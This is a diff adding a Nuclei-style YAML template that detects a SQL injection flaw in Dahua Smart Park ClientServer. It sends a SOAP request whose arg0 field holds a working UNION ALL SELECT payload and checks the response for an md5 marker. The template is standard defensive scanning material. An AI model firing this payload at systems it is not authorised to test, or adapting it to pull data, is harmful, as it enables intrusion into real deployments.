@@ -1,0 +1,49 @@
+id: dahua-smart-park-clientserver-sql-injection
+info:
+  name: Dahua Smart Park ClientServer SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dahua Smart Park ClientServer allowing remote attackers to execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - /portal/services/clientServer
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <cli:getGroupInfoListByGroupId>
+          <!--type: string-->
+            <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5({{t1}})-- -</arg0>
+          <!--type: long-->
+          <arg1>10</arg1>
+          </cli:getGroupInfoListByGroupId>
+          </soapenv:Body>
+      </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "groupdetail"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
